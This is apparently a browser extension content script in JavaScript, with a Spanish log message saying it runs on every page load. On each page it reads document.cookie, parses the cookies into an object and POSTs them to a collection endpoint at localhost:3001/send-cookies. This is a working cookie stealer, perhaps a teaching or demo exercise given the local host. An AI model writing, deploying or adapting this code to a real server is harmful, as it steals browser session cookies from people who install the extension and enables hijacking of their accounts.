console.log('El fichero content_script.js se ejecuta cada vez que se carga una nueva página');

var cookies = extractCookies(document.cookie);

var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "http://localhost:3001/send-cookies");
xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");


xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState === 4) {
        var response = JSON.parse(xmlhttp.responseText);
        if (xmlhttp.status === 200) {
            console.log('OK', response);
        } else {
            console.log('KO', response);
        }
    }
}

xmlhttp.send(JSON.stringify(cookies));

function extractCookies(cookieStr) {
    return cookieStr
      .match(/(^|(?<=, ))[^=;,]+=[^;]+/g)
      .map(cookie => cookie.split('=').map(v => v.trim()))
      .filter(v => v[0].length && v[1].length)
      .reduce((builder, cur) => {
        builder[cur[0]] = cur[1]
        return builder
      }, {})
  }